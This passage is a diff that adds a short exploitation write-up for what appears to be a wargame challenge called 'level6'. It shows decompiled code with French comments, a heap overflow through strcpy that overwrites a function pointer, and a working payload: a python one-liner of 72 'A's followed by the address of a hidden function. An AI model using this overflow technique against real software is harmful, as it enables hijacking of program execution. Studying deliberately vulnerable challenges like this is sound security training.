@@ -1,0 +1,35 @@
+edx            0x8048468        134513768
+
+int32_t main (char ** envp) {
+    const char * src;
+    void * var_18h;
+    char * dest;
+    eax = malloc (0x40);
+    eax = malloc (4, eax);
+    var_18h = eax;
+    edx = m;                    //edx -> m (la fonction)
+    eax = var_18h;
+    *(eax) = edx;               //m est mise à l'adresse de var_18h (dans le malloc)
+    eax = envp;                 
+    eax += 4;
+    eax = *(eax);
+    edx = *(eax);
+    eax = dest;
+    strcpy (eax, edx);
+    eax = var_18h;          
+    eax = *(eax);              //On récupère m
+    void (*eax)() ();          //On l'execute
+    return eax;
+}
+
+//I tried to overflow
+
+// AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA -> Segfault (72 ch).
+
+if we enter this buffer plus 4 character such as aaaa, the eip address became 0x61616161
+So I decided that I would simply replace those 4 a with the n function address -> 0x08048454 -> \x54\x84\x04\x08
+
+python -c "print 'A'*72 + '\x54\x84\x04\x08'" > /tmp/file
+./level6 $(cat /tmp/file)
+
+and it worked
